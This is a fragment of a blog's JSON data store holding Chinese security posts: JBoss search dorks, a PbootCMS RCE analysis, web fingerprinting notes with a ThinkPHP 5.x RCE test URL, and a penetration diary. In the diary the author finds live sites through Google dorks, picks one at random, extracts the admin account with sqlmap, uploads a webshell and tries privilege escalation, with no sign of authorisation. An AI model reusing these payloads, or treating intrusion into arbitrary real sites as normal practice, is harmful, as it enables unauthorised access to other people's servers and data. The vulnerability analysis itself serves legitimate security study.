ublic/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1549165339538},{"_id":"public/lib/algolia-instant-search/instantsearch.min.js","hash":"9ccc6f8144f54e86df9a3fd33a18368d81cf3a4f","modified":1549165339544},{"_id":"public/lib/three/three.min.js","hash":"73f4cdc17e51a72b9bf5b9291f65386d615c483b","modified":1549165339548}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Java容器安全总结","date":"2018-11-19T06:06:07.000Z","_content":"## JBOSS\n\nJBoss应用服务器（JBoss AS）是一个被广泛使用的开源Java应用服务器。\n\n它是JBoss企业中间件（JEMS）的一部分，并且经常在**大型企业**中使用。\n\n### 信息识别与收集\n\n默认端口8080\n\n寻找JBoss服务器的方法：\ngoogle hack\ninurl:\"jmx-console/HtmlAdaptor\"\nintitle:\"Welcome to JBoss\"\n\nfofa,shodan,zoomeye网络空间搜索引擎","source":"_posts/Java容器安全总结.md","raw":"---\ntitle: Java容器安全总结\ndate: 2018-11-19 14:06:07\ntags:\n---\n## JBOSS\n\nJBoss应用服务器（JBoss AS）是一个被广泛使用的开源Java应用服务器。\n\n它是JBoss企业中间件（JEMS）的一部分，并且经常在**大型企业**中使用。\n\n### 信息识别与收集\n\n默认端口8080\n\n寻找JBoss服务器的方法：\ngoogle hack\ninurl:\"jmx-console/HtmlAdaptor\"\nintitle:\"Welcome to JBoss\"\n\nfofa,shodan,zoomeye网络空间搜索引擎","slug":"Java容器安全总结","published":1,"updated":"2018-11-20T06:12:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjrod1l5o0000143av9m65p7x","content":"<h2 id=\"JBOSS\"><a href=\"#JBOSS\" class=\"headerlink\" title=\"JBOSS\"></a>JBOSS</h2><p>JBoss应用服务器（JBoss AS）是一个被广泛使用的开源Java应用服务器。</p>\n<p>它是JBoss企业中间件（JEMS）的一部分，并且经常在<strong>大型企业</strong>中使用。</p>\n<h3 id=\"信息识别与收集\"><a href=\"#信息识别与收集\" class=\"headerlink\" title=\"信息识别与收集\"></a>信息识别与收集</h3><p>默认端口8080</p>\n<p>寻找JBoss服务器的方法：<br>google hack<br>inurl:”jmx-console/HtmlAdaptor”<br>intitle:”Welcome to JBoss”</p>\n<p>fofa,shodan,zoomeye网络空间搜索引擎</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JBOSS\"><a href=\"#JBOSS\" class=\"headerlink\" title=\"JBOSS\"></a>JBOSS</h2><p>JBoss应用服务器（JBoss AS）是一个被广泛使用的开源Java应用服务器。</p>\n<p>它是JBoss企业中间件（JEMS）的一部分，并且经常在<strong>大型企业</strong>中使用。</p>\n<h3 id=\"信息识别与收集\"><a href=\"#信息识别与收集\" class=\"headerlink\" title=\"信息识别与收集\"></a>信息识别与收集</h3><p>默认端口8080</p>\n<p>寻找JBoss服务器的方法：<br>google hack<br>inurl:”jmx-console/HtmlAdaptor”<br>intitle:”Welcome to JBoss”</p>\n<p>fofa,shodan,zoomeye网络空间搜索引擎</p>\n"},{"title":"PbootCMS v1.1.4 Remote Code Execute Vulnerability","date":"2018-09-07T23:30:08.000Z","_content":"\n## 分析 ##\n\n![](1.jpg)\n\n漏洞出现在apps\\home\\controller\\ParserController.php的`parserIfLabel`函数,漏洞有关的代码在1835到1848行，其中1848行出现了`eval`函数。\n\n这段函数采用了两次正则匹配的过滤方式，第一次正则需要构造形如`{pboot:if(payload)}{/pboot:if}`这样的字符串。\n\n第二次正则需要payload中不能出现字母+()这样形式的函数，直接使用形如`phpinfo(1)`的payload即可。\n\n![](2.jpg)\n\n![](3.jpg)\n\n然后回溯函数可以看到`parserIfLabel`函数被`parserCommom`函数所引用，继续回溯可发现该函数出现在如图位置，其中可利用的位置非常多，前台的搜索、留言，后台的各项信息修改等位置都可以传参执行。\n\n以下以留言板举例：\n\n![](4.jpg)\n构造这样的留言表单提交，即可成功执行代码。\n![](5.jpg)\n\n因其余位置任意代码执行利用同理，此处不再赘述。\n\n## 修复 ##\n![](6.jpg)\n系统的高版本对此漏洞进行了修复，增加了安全校验过滤。\n","source":"_posts/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability.md","raw":"---\ntitle: PbootCMS v1.1.4 Remote Code Execute Vulnerability\ndate: 2018-09-08 07:30:08\ntags:\n---\n\n## 分析 ##\n\n![](1.jpg)\n\n漏洞出现在apps\\home\\controller\\ParserController.php的`parserIfLabel`函数,漏洞有关的代码在1835到1848行，其中1848行出现了`eval`函数。\n\n这段函数采用了两次正则匹配的过滤方式，第一次正则需要构造形如`{pboot:if(payload)}{/pboot:if}`这样的字符串。\n\n第二次正则需要payload中不能出现字母+()这样形式的函数，直接使用形如`phpinfo(1)`的payload即可。\n\n![](2.jpg)\n\n![](3.jpg)\n\n然后回溯函数可以看到`parserIfLabel`函数被`parserCommom`函数所引用，继续回溯可发现该函数出现在如图位置，其中可利用的位置非常多，前台的搜索、留言，后台的各项信息修改等位置都可以传参执行。\n\n以下以留言板举例：\n\n![](4.jpg)\n构造这样的留言表单提交，即可成功执行代码。\n![](5.jpg)\n\n因其余位置任意代码执行利用同理，此处不再赘述。\n\n## 修复 ##\n![](6.jpg)\n系统的高版本对此漏洞进行了修复，增加了安全校验过滤。\n","slug":"PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability","published":1,"updated":"2018-09-07T23:31:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjrod1l5s0001143aywig2h14","content":"<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/1.jpg\" alt=\"\"></p>\n<p>漏洞出现在apps\\home\\controller\\ParserController.php的<code>parserIfLabel</code>函数,漏洞有关的代码在1835到1848行，其中1848行出现了<code>eval</code>函数。</p>\n<p>这段函数采用了两次正则匹配的过滤方式，第一次正则需要构造形如<code>{pboot:if(payload)}{/pboot:if}</code>这样的字符串。</p>\n<p>第二次正则需要payload中不能出现字母+()这样形式的函数，直接使用形如<code>phpinfo(1)</code>的payload即可。</p>\n<p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/2.jpg\" alt=\"\"></p>\n<p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/3.jpg\" alt=\"\"></p>\n<p>然后回溯函数可以看到<code>parserIfLabel</code>函数被<code>parserCommom</code>函数所引用，继续回溯可发现该函数出现在如图位置，其中可利用的位置非常多，前台的搜索、留言，后台的各项信息修改等位置都可以传参执行。</p>\n<p>以下以留言板举例：</p>\n<p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/4.jpg\" alt=\"\"><br>构造这样的留言表单提交，即可成功执行代码。<br><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/5.jpg\" alt=\"\"></p>\n<p>因其余位置任意代码执行利用同理，此处不再赘述。</p>\n<h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/6.jpg\" alt=\"\"><br>系统的高版本对此漏洞进行了修复，增加了安全校验过滤。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/1.jpg\" alt=\"\"></p>\n<p>漏洞出现在apps\\home\\controller\\ParserController.php的<code>parserIfLabel</code>函数,漏洞有关的代码在1835到1848行，其中1848行出现了<code>eval</code>函数。</p>\n<p>这段函数采用了两次正则匹配的过滤方式，第一次正则需要构造形如<code>{pboot:if(payload)}{/pboot:if}</code>这样的字符串。</p>\n<p>第二次正则需要payload中不能出现字母+()这样形式的函数，直接使用形如<code>phpinfo(1)</code>的payload即可。</p>\n<p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/2.jpg\" alt=\"\"></p>\n<p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/3.jpg\" alt=\"\"></p>\n<p>然后回溯函数可以看到<code>parserIfLabel</code>函数被<code>parserCommom</code>函数所引用，继续回溯可发现该函数出现在如图位置，其中可利用的位置非常多，前台的搜索、留言，后台的各项信息修改等位置都可以传参执行。</p>\n<p>以下以留言板举例：</p>\n<p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/4.jpg\" alt=\"\"><br>构造这样的留言表单提交，即可成功执行代码。<br><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/5.jpg\" alt=\"\"></p>\n<p>因其余位置任意代码执行利用同理，此处不再赘述。</p>\n<h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p><img src=\"/2018/09/08/PbootCMS-v1-1-4-Remote-Code-Execute-Vulnerability/6.jpg\" alt=\"\"><br>系统的高版本对此漏洞进行了修复，增加了安全校验过滤。</p>\n"},{"title":"web渗透测试（黑盒）","date":"2018-11-20T06:17:46.000Z","_content":"## banner识别 ##\n\n先谈几个工具：\n- 云悉：http://www.yunsee.cn/ 很适合国内环境，CMS指纹识别很好。\n- wappalyzer：https://www.wappalyzer.com/ 国际通用的识别工具，有浏览器插件，很方便。\n- Fofa，shodan（偏向网络设备路由摄像头等），Zoomeye（偏向web）这些网络空间搜索器也很好用。\n- whatweb：https://github.com/urbanadventurer/WhatWeb 很强大，kali自带，但对国内CMS识别不是很合适。\n- CMSeeK：https://github.com/Tuhinshubhra/CMSeeK 集成了cms的poc，持续有更新，很适合 WordPress, Joomla, Drupal。\n\n一般情况下，能够使用以上工具能获得信息的说明本身对banner信息就并没有做很多的隐藏，如果本身做了隐藏的，就要通过经验来获取更多的信息来做判断。\n\n比如利用404界面判断，再比如利用目录字典扫描像wordpress里面的readme.html\n\n例如简单的有服务器信息的，IIS→.NET，apacheHTTP→php，java系列的就不必多说。\n\n### PHP ###\n\nphp大多都是使用各种CMS，在这里稍微总结一下所知的常见cms的特殊识别经验以及敏感后台目录。\n\n- 基于ThinkPHP的CMS\n\n[[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录](https://xz.aliyun.com/t/3570)\n通用测试链接：http://TargetHost/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\n\n- Wordpress\n\ncss文件，根目录下的`readme.html`，后台登录`/wp-login.php`，路径目录`/wp-includes`、`/wp-content`。`/xmlrpc.php`如果开启了xmlrpc的服务，可以利用来进行批量爆破。\n![](1.jpg)\n推荐使用**wpscan**，一个专门针对wordpress的扫描器。\n\n- Discuz！\n\n国内的中小型论坛基本上大部分都是discuz，首先默认模版很明显首页路径`/portal.php`，后台登录路径为`/admin.php`，`/api/uc.php`也是一个特征目录。\n\n\n- dedecms（织梦）\n\n","source":"_posts/web渗透测试（黑盒）.md","raw":"---\ntitle: web渗透测试（黑盒）\ndate: 2018-11-20 14:17:46\ntags:\n---\n## banner识别 ##\n\n先谈几个工具：\n- 云悉：http://www.yunsee.cn/ 很适合国内环境，CMS指纹识别很好。\n- wappalyzer：https://www.wappalyzer.com/ 国际通用的识别工具，有浏览器插件，很方便。\n- Fofa，shodan（偏向网络设备路由摄像头等），Zoomeye（偏向web）这些网络空间搜索器也很好用。\n- whatweb：https://github.com/urbanadventurer/WhatWeb 很强大，kali自带，但对国内CMS识别不是很合适。\n- CMSeeK：https://github.com/Tuhinshubhra/CMSeeK 集成了cms的poc，持续有更新，很适合 WordPress, Joomla, Drupal。\n\n一般情况下，能够使用以上工具能获得信息的说明本身对banner信息就并没有做很多的隐藏，如果本身做了隐藏的，就要通过经验来获取更多的信息来做判断。\n\n比如利用404界面判断，再比如利用目录字典扫描像wordpress里面的readme.html\n\n例如简单的有服务器信息的，IIS→.NET，apacheHTTP→php，java系列的就不必多说。\n\n### PHP ###\n\nphp大多都是使用各种CMS，在这里稍微总结一下所知的常见cms的特殊识别经验以及敏感后台目录。\n\n- 基于ThinkPHP的CMS\n\n[[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录](https://xz.aliyun.com/t/3570)\n通用测试链接：http://TargetHost/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\n\n- Wordpress\n\ncss文件，根目录下的`readme.html`，后台登录`/wp-login.php`，路径目录`/wp-includes`、`/wp-content`。`/xmlrpc.php`如果开启了xmlrpc的服务，可以利用来进行批量爆破。\n![](1.jpg)\n推荐使用**wpscan**，一个专门针对wordpress的扫描器。\n\n- Discuz！\n\n国内的中小型论坛基本上大部分都是discuz，首先默认模版很明显首页路径`/portal.php`，后台登录路径为`/admin.php`，`/api/uc.php`也是一个特征目录。\n\n\n- dedecms（织梦）\n\n","slug":"web渗透测试（黑盒）","published":1,"updated":"2019-01-07T17:22:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjrod1l5u0002143ag06quy70","content":"<h2 id=\"banner识别\"><a href=\"#banner识别\" class=\"headerlink\" title=\"banner识别\"></a>banner识别</h2><p>先谈几个工具：</p>\n<ul>\n<li>云悉：<a href=\"http://www.yunsee.cn/\" target=\"_blank\" rel=\"noopener\">http://www.yunsee.cn/</a> 很适合国内环境，CMS指纹识别很好。</li>\n<li>wappalyzer：<a href=\"https://www.wappalyzer.com/\" target=\"_blank\" rel=\"noopener\">https://www.wappalyzer.com/</a> 国际通用的识别工具，有浏览器插件，很方便。</li>\n<li>Fofa，shodan（偏向网络设备路由摄像头等），Zoomeye（偏向web）这些网络空间搜索器也很好用。</li>\n<li>whatweb：<a href=\"https://github.com/urbanadventurer/WhatWeb\" target=\"_blank\" rel=\"noopener\">https://github.com/urbanadventurer/WhatWeb</a> 很强大，kali自带，但对国内CMS识别不是很合适。</li>\n<li>CMSeeK：<a href=\"https://github.com/Tuhinshubhra/CMSeeK\" target=\"_blank\" rel=\"noopener\">https://github.com/Tuhinshubhra/CMSeeK</a> 集成了cms的poc，持续有更新，很适合 WordPress, Joomla, Drupal。</li>\n</ul>\n<p>一般情况下，能够使用以上工具能获得信息的说明本身对banner信息就并没有做很多的隐藏，如果本身做了隐藏的，就要通过经验来获取更多的信息来做判断。</p>\n<p>比如利用404界面判断，再比如利用目录字典扫描像wordpress里面的readme.html</p>\n<p>例如简单的有服务器信息的，IIS→.NET，apacheHTTP→php，java系列的就不必多说。</p>\n<h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><p>php大多都是使用各种CMS，在这里稍微总结一下所知的常见cms的特殊识别经验以及敏感后台目录。</p>\n<ul>\n<li>基于ThinkPHP的CMS</li>\n</ul>\n<p><a href=\"https://xz.aliyun.com/t/3570\" target=\"_blank\" rel=\"noopener\">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a><br>通用测试链接：<a href=\"http://TargetHost/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1\" target=\"_blank\" rel=\"noopener\">http://TargetHost/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a></p>\n<ul>\n<li>Wordpress</li>\n</ul>\n<p>css文件，根目录下的<code>readme.html</code>，后台登录<code>/wp-login.php</code>，路径目录<code>/wp-includes</code>、<code>/wp-content</code>。<code>/xmlrpc.php</code>如果开启了xmlrpc的服务，可以利用来进行批量爆破。<br><img src=\"/2018/11/20/web渗透测试（黑盒）/1.jpg\" alt=\"\"><br>推荐使用<strong>wpscan</strong>，一个专门针对wordpress的扫描器。</p>\n<ul>\n<li>Discuz！</li>\n</ul>\n<p>国内的中小型论坛基本上大部分都是discuz，首先默认模版很明显首页路径<code>/portal.php</code>，后台登录路径为<code>/admin.php</code>，<code>/api/uc.php</code>也是一个特征目录。</p>\n<ul>\n<li>dedecms（织梦）</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"banner识别\"><a href=\"#banner识别\" class=\"headerlink\" title=\"banner识别\"></a>banner识别</h2><p>先谈几个工具：</p>\n<ul>\n<li>云悉：<a href=\"http://www.yunsee.cn/\" target=\"_blank\" rel=\"noopener\">http://www.yunsee.cn/</a> 很适合国内环境，CMS指纹识别很好。</li>\n<li>wappalyzer：<a href=\"https://www.wappalyzer.com/\" target=\"_blank\" rel=\"noopener\">https://www.wappalyzer.com/</a> 国际通用的识别工具，有浏览器插件，很方便。</li>\n<li>Fofa，shodan（偏向网络设备路由摄像头等），Zoomeye（偏向web）这些网络空间搜索器也很好用。</li>\n<li>whatweb：<a href=\"https://github.com/urbanadventurer/WhatWeb\" target=\"_blank\" rel=\"noopener\">https://github.com/urbanadventurer/WhatWeb</a> 很强大，kali自带，但对国内CMS识别不是很合适。</li>\n<li>CMSeeK：<a href=\"https://github.com/Tuhinshubhra/CMSeeK\" target=\"_blank\" rel=\"noopener\">https://github.com/Tuhinshubhra/CMSeeK</a> 集成了cms的poc，持续有更新，很适合 WordPress, Joomla, Drupal。</li>\n</ul>\n<p>一般情况下，能够使用以上工具能获得信息的说明本身对banner信息就并没有做很多的隐藏，如果本身做了隐藏的，就要通过经验来获取更多的信息来做判断。</p>\n<p>比如利用404界面判断，再比如利用目录字典扫描像wordpress里面的readme.html</p>\n<p>例如简单的有服务器信息的，IIS→.NET，apacheHTTP→php，java系列的就不必多说。</p>\n<h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><p>php大多都是使用各种CMS，在这里稍微总结一下所知的常见cms的特殊识别经验以及敏感后台目录。</p>\n<ul>\n<li>基于ThinkPHP的CMS</li>\n</ul>\n<p><a href=\"https://xz.aliyun.com/t/3570\" target=\"_blank\" rel=\"noopener\">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a><br>通用测试链接：<a href=\"http://TargetHost/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1\" target=\"_blank\" rel=\"noopener\">http://TargetHost/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a></p>\n<ul>\n<li>Wordpress</li>\n</ul>\n<p>css文件，根目录下的<code>readme.html</code>，后台登录<code>/wp-login.php</code>，路径目录<code>/wp-includes</code>、<code>/wp-content</code>。<code>/xmlrpc.php</code>如果开启了xmlrpc的服务，可以利用来进行批量爆破。<br><img src=\"/2018/11/20/web渗透测试（黑盒）/1.jpg\" alt=\"\"><br>推荐使用<strong>wpscan</strong>，一个专门针对wordpress的扫描器。</p>\n<ul>\n<li>Discuz！</li>\n</ul>\n<p>国内的中小型论坛基本上大部分都是discuz，首先默认模版很明显首页路径<code>/portal.php</code>，后台登录路径为<code>/admin.php</code>，<code>/api/uc.php</code>也是一个特征目录。</p>\n<ul>\n<li>dedecms（织梦）</li>\n</ul>\n"},{"layout":"““","title":"一次渗透纪实分享","date":"2018-08-24T09:28:57.000Z","_content":"\n# 记一次从代码审计到webshell到提权尝试的完整渗透过程 #\n\n## 代码审计 ##\n\n![noname](一次渗透纪实/首页.jpg)\n如图这次审计做的是某发卡cms，整体就是一个用户购买卡并提取卡密的平台。\n![目录](一次渗透纪实/目录.jpg)\n如图，结构比较简单。\n\n其中config.php为mysql配置文件，其中会有mysql配置信息，下文会再提到。\n\n![readme](一次渗透纪实/readme.jpg)\n从readme里面可以看到，此CMS在18年4月还进行了更新。但此CMS安全水平非常差，可以说是漏洞百出。下面进行分析\n\n### sql漏洞 ###\n\n进入`getkm.php`，这是一个提取卡密的页面，提供了查询卡密的接口。部分sql关键代码如下\n```php\n\t<?php }elseif ($_GET['act'] == \"query\") { \n\t/**/\n\tif(!empty($_POST['tqm'])){\n    $tqm = $_POST['tqm'];\n    $sql = \"select * from ayangw_km\n    where out_trade_no ='{$tqm}' or trade_no = '{$tqm}' or rel = '{$tqm}'\n    ORDER BY endTime desc\n    limit 1\";\n    \n    $res = $DB->query($sql);\n    if($row = $DB->fetch($res)){\n        $sql2 = \"select * from ayangw_goods where id =\".$row['gid'];\n        $res2 = $DB->query($sql2);\n        $row2 =$DB->fetch($res2);\n    }else{\n        exit(\"<script>alert('无此条记录！');window.location.href='getkm.php'</script>\");\n        \n    }\n}\n\t    ?>\n```\n\n可以看到典型的sql直接拼接造成的sql漏洞，`$tqm`参数直接传入用户输入也未做过滤。我回溯了`$DB`函数，也未发现安全过滤措施，所以sqlmap直接可以撸下来。\n\n![noname](一次渗透纪实/sqlmap.jpg)\n\n其他地方的sql查询也差不多，漏洞百出，就此跳过sql注入。\n\n### 后台上传漏洞 ###\n\n来到后台在`set.php`，上传logo的代码部分如下：\n```php\nif($_GET['mod']=='upimg'){\necho '<div class=\"panel panel-primary\"><div class=\"panel-heading\"><h3 class=\"panel-title\">更改首页LOGO</h3> </div><div class=\"panel-body\">';\nif($_POST['s']==1){\n$extension=explode('.',$_FILES['file']['name']);\nif (($length = count($extension)) > 1) {\n$ext = strtolower($extension[$length - 1]);\n}\nif($ext=='png'||$ext=='gif'||$ext=='jpg'||$ext=='jpeg'||$ext=='bmp')$ext='png';\ncopy($_FILES['file']['tmp_name'], ROOT.'/assets/imgs/logo.'.$ext);\necho \"成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）\";\n}\n```\n可以看到作者的思路就是分割开文件名跟文件后缀，然后对后缀进行小写处理，再进行对比，如果是作者白名单里的图片格式就统一改成`png`格式。\n\n但是让人哭笑不得的是作者只写了白名单的处理，`if`之后居然没写`else`。。。而且白名单的比较也是弱类型的比较，并且没有对截断符号等进行过滤。\n\n简化了一下写了一个demo示意了一下上传过程，可以看到我们的上传的文件将会直接变成`/assets/imgs/logo.php`\n![noname](一次渗透纪实/demo.jpg)\n\n所以我们可以这样上传拿到webshell。\n\n## webshell ##\n\ngooglehack了一下，用这个卡密CMS的网站还不少。\n\n![noname](一次渗透纪实/google.jpg)\n\n顺便一说，在git也发现了跟这个发卡系统非常象的一个CMS，大概上区别不大，也不知道是谁抄谁的。\n\n随便找了一个想拿个webshell试试，基本就是按照审计发现的思路，`sqlmap`爆了`admin`然后进后台传`webshell`。\n\n![noname](一次渗透纪实/phpinfo.jpg)\n\n## 尝试提权失败，记一下思路 ##\n\n从**phpinfo**中可以看到系统为windows NT CLOUD 5.2 2003，php版本为5.2,此版本暂时不知道如何绕过**disablefunction**。\n![noname](一次渗透纪实/cknife.jpg)\n![noname](一次渗透纪实/dis.png)\n可以看到只有D盘的读写权限，php命令执行权限也全部禁掉了，放弃利用php提权。\n\nnmap扫一下看看\n![noname](一次渗透纪实/nmap.png)\n\n 可以看到有**3306**的mysql端口，尝试连接有IP限制。**999**端口则是**phpmyadmin**，之前在上文提到的`config.php`配置文件中可以get到数据库的**root**，于是进去**phpmyadmin**，尝试UDF,MOF提权，均无果。\n\n![noname](一次渗透纪实/phpmyadmin.png)\n\n 有大佬提醒了一下`IIS`可以试试asp，aspx是否可以提权，测试aspx无法执行，但asp可以。上传asp测试后，组件也都不可用。。。提权无果\n![noname](一次渗透纪实/asp.png)\n\n 新手一枚请多担待！","source":"_posts/一次渗透纪实.md","raw":"---\nlayout: ““\ntitle: 一次渗透纪实分享\ndate: 2018-08-24 17:28:57\ntags:\n---\n\n# 记一次从代码审计到webshell到提权尝试的完整渗透过程 #\n\n## 代码审计 ##\n\n![noname](一次渗透纪实/首页.jpg)\n如图这次审计做的是某发卡cms，整体就是一个用户购买卡并提取卡密的平台。\n![目录](一次渗透纪实/目录.jpg)\n如图，结构比较简单。\n\n其中config.php为mysql配置文件，其中会有mysql配置信息，下文会再提到。\n\n![readme](一次渗透纪实/readme.jpg)\n从readme里面可以看到，此CMS在18年4月还进行了更新。但此CMS安全水平非常差，可以说是漏洞百出。下面进行分析\n\n### sql漏洞 ###\n\n进入`getkm.php`，这是一个提取卡密的页面，提供了查询卡密的接口。部分sql关键代码如下\n```php\n\t<?php }elseif ($_GET['act'] == \"query\") { \n\t/**/\n\tif(!empty($_POST['tqm'])){\n    $tqm = $_POST['tqm'];\n    $sql = \"select * from ayangw_km\n    where out_trade_no ='{$tqm}' or trade_no = '{$tqm}' or rel = '{$tqm}'\n    ORDER BY endTime desc\n    limit 1\";\n    \n    $res = $DB->query($sql);\n    if($row = $DB->fetch($res)){\n        $sql2 = \"select * from ayangw_goods where id =\".$row['gid'];\n        $res2 = $DB->query($sql2);\n        $row2 =$DB->fetch($res2);\n    }else{\n        exit(\"<script>alert('无此条记录！');window.location.href='getkm.php'</script>\");\n        \n    }\n}\n\t    ?>\n```\n\n可以看到典型的sql直接拼接造成的sql漏洞，`$tqm`参数直接传入用户输入也未做过滤。我回溯了`$DB`函数，也未发现安全过滤措施，所以sqlmap直接可以撸下来。\n\n![noname](一次渗透纪实/sqlmap.jpg)\n\n其他地方的sql查询也差不多，漏洞百出，就此跳过sql注入。\n\n### 后台上传漏洞 ###\n\n来到后台在`set.php`，上传logo的代码部分如下：\n```php\nif($_GET['mod']=='upimg'){\necho '<div class=\"panel panel-primary\"><div class=\"panel-heading\"><h3 class=\"panel-title\">更改首页LOGO</h3> </div><div class=\"panel-body\">';\nif($_POST['s']==1){\n$extension=explode('.',$_FILES['file']['name']);\nif (($length = count($extension)) > 1) {\n$ext = strtolower($extension[$length - 1]);\n}\nif($ext=='png'||$ext=='gif'||$ext=='jpg'||$ext=='jpeg'||$ext=='bmp')$ext='png';\ncopy($_FILES['file']['tmp_name'], ROOT.'/assets/imgs/logo.'.$ext);\necho \"成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）\";\n}\n```\n可以看到作者的思路就是分割开文件名跟文件后缀，然后对后缀进行小写处理，再进行对比，如果是作者白名单里的图片格式就统一改成`png`格式。\n\n但是让人哭笑不得的是作者只写了白名单的处理，`if`之后居然没写`else`。。。而且白名单的比较也是弱类型的比较，并且没有对截断符号等进行过滤。\n\n简化了一下写了一个demo示意了一下上传过程，可以看到我们的上传的文件将会直接变成`/assets/imgs/logo.php`\n![noname](一次渗透纪实/demo.jpg)\n\n所以我们可以这样上传拿到webshell。\n\n## webshell ##\n\ngooglehack了一下，用这个卡密CMS的网站还不少。\n\n![noname](一次渗透纪实/google.jpg)\n\n顺便一说，在git也发现了跟这个发卡系统非常象的一个CMS，大概上区别不大，也不知道是谁抄谁的。\n\n随便找了一个想拿个webshell试试，基本就是按照审计发现的思路，`sqlmap`爆了`admin`然后进后台传`webshell`。\n\n![noname](一次渗透纪实/phpinfo.jpg)\n\n## 尝试提权失败，记一下思路 ##\n\n从**phpinfo**中可以看到系统为windows NT CLOUD 5.2 2003，php版本为5.2,此版本暂时不知道如何绕过**disablefunction**。\n![noname](一次渗透纪实/cknife.jpg)\n![noname](一次渗透纪实/dis.png)\n可以看到只有D盘的读写权限，php命令执行权限也全部禁掉了，放弃利用php提权。\n\nnmap扫一下看看\n![noname](一次渗透纪实/nmap.png)\n\n 可以看到有**3306**的mysql端口，尝试连接有IP限制。**999**端口则是**phpmyadmin**，之前在上文提到的`config.php`配置文件中可以get到数据库的**root**，于是进去**phpmyadmin**，尝试UDF,MOF提权，均无果。\n\n![noname](一次渗透纪实/phpmyadmin.png)\n\n 有大佬提醒了一下`IIS`可以试试asp，aspx是否可以提权，测试aspx无法执行，但asp可以。上传asp测试后，组件也都不可用。。。提权无果\n![noname](一次渗透纪实/asp.png)\n\n 新手一枚请多担待！","slug":"一次渗透纪实","published":1,"updated":"2018-08-24T18:38:14.000Z","comments":1,"photos":[],"link":"","_id":"cjrod1l5w0003143asctzygwz","content":"<h1 id=\"记一次从代码审计到webshell到提权尝试的完整渗透过程\"><a href=\"#记一次从代码审计到webshell到提权尝试的完整渗透过程\" class=\"headerlink\" title=\"记一次从代码审计到webshell到提权尝试的完整渗透过程\"></a>记一次从代码审计到webshell到提权尝试的完整渗透过程</h1><h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p><img src=\"/2018/08/24/一次渗透纪实/首页.jpg\" alt=\"noname\"><br>如图这次审计做的是某发卡cms，整体就是一个用户购买卡并提取卡密的平台。<br><img src=\"/2018/08/24/一次渗透纪实/目录.jpg\" alt=\"目录\"><br>如图，结构比较简单。</p>\n<p>其中config.php为mysql配置文件，其中会有mysql配置信息，下文会再提到。</p>\n<p><img src=\"/2018/08/24/一次渗透纪实/readme.jpg\" alt=\"readme\"><br>从readme里面可以看到，此CMS在18年4月还进行了更新。但此CMS安全水平非常差，可以说是漏洞百出。下面进行分析</p>\n<h3 id=\"sql漏洞\"><a href=\"#sql漏洞\" class=\"headerlink\" title=\"sql漏洞\"></a>sql漏洞</h3><p>进入<code>getkm.php</code>，这是一个提取卡密的页面，提供了查询卡密的接口。部分sql关键代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span 